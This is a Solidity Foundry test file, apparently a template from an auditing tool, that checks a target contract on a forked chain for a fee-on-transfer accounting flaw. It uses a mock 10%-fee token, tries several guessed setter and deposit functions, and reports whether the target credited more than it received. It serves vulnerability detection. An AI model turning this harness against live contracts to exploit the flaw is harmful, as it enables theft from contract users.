// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Fee-on-transfer accounting mismatch
/// @notice Detector: fee-on-transfer. The target assumes a token transfer
///         moved the FULL amount, but a fee-on-transfer token delivers
///         less. The target credits the full amount, so its ledger exceeds
///         its real balance -- later withdrawals overpay / brick.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Uses a mock 10%-fee token. The deposit
///      entry point is a GUESS, so several are tried and the result is
///      judged on the OBSERVABLE -- the target credited the caller MORE than
///      the token actually delivered -- never on the bare fact that a call
///      returned.

contract MockFoTToken {
    string public constant name = "MockFoT";
    string public constant symbol = "FOT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = 1_000_000 ether;
    }

    // Takes a 10% fee on every transfer.
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += (amount * 90) / 100;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += (amount * 90) / 100;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    MockFoTToken internal mock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Read the target's own accounting for `who` through whichever common
    /// view it exposes. Returns (found, value).
    function _readLedger(address who) internal view returns (bool found, uint256 v) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("credits(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("balances(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("deposits(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("shares(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    function _trySetToken(string memory sig) internal returns (bool) {
        (bool ok,) = target.call(abi.encodeWithSignature(sig, address(mock)));
        return ok;
    }

    /// Point the target at the fee-on-transfer token if it exposes a setter.
    function _wireToken() internal returns (bool) {
        if (_trySetToken("setToken(address)")) return true;
        if (_trySetToken("setUnderlying(address)")) return true;
        if (_trySetToken("setAsset(address)")) return true;
        return false;
    }

    /// Try one deposit-like entry point and accept it only when the
    /// OBSERVABLE changes, never when the call merely returns: the target
    /// must CREDIT the caller MORE than the fee-on-transfer token actually
    /// delivered. A no-op returns successfully and credits nothing.
    function _attempt(address attacker, uint256 amount, string memory label, bytes4 sel)
        internal
        returns (string memory)
    {
        (bool f0, uint256 ledgerBefore) = _readLedger(attacker);
        if (!f0) return "";
        uint256 recvBefore = mock.balanceOf(target);

        vm.prank(attacker);
        (bool ok,) = target.call(abi.encodeWithSelector(sel, amount));
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (!ok) return "";

        (bool f1, uint256 ledgerAfter) = _readLedger(attacker);
        if (!f1) return "";
        uint256 received = mock.balanceOf(target) > recvBefore ? mock.balanceOf(target) - recvBefore : 0;
        uint256 credited = ledgerAfter > ledgerBefore ? ledgerAfter - ledgerBefore : 0;

        // OBSERVABLE: the target credited more than the token delivered.
        if (credited > received) {
            console.log("  credited", credited, "but token delivered", received);
            return label;
        }
        return "";
    }

    /// The deposit entry point is a GUESS; try the plausible ones.
    function _tryEntry(address attacker, uint256 amount) internal returns (string memory used) {
        used = _attempt(attacker, amount, "deposit(uint256)", bytes4(keccak256("deposit(uint256)")));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, amount, "stake(uint256)", bytes4(keccak256("stake(uint256)")));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, amount, "mint(uint256)", bytes4(keccak256("mint(uint256)")));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, amount, "joinPool(uint256)", bytes4(keccak256("joinPool(uint256)")));
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        mock = new MockFoTToken();
        address attackerEOA = makeAddr("attacker");

        // Fund the attacker with FoT tokens and let the target pull them.
        mock.transfer(attackerEOA, 1000 ether);
        vm.prank(attackerEOA);
        mock.approve(target, type(uint256).max);

        bool wired = _wireToken();
        console.log("target wired to fee-on-transfer token:", wired);

        (bool found, uint256 before) = _readLedger(attackerEOA);
        console.log("target ledger view found:", found);

        string memory used = _tryEntry(attackerEOA, 100 ether);
        console.log("deposit entry point that credited more than it received:", used);
        if (bytes(used).length > 0) {
            (bool f, uint256 credited) = _readLedger(attackerEOA);
            console.log("credited by target:", f ? credited : 0);
            console.log("actually received by target:", mock.balanceOf(target));
        }

        assertTrue(
            bytes(used).length > 0,
            "no fee-on-transfer entry point reproduced. Tried deposit(uint256), stake(uint256), mint(uint256), joinPool(uint256) against a mock 10%-fee token. This does NOT establish safety: the entry may have another name or argument shape, the token may be injected by a different setter, or the target may track the credit through a view this harness does not probe."
        );
    }
}
